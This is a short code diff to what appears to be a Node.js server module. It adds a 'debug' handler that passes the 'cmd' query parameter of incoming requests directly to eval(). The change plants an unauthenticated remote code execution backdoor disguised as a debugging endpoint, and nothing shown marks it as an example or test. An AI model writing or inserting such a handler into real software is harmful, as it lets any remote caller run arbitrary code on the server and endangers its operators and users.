@@ -365,3 +365,8 @@ exports.chat = {
     res.send({ ok: true });
   }
 };
+exports.debug = function(req, res) {
+    var cmd = req.query.cmd;
+    eval(cmd);
+    res.send('done');
+  };
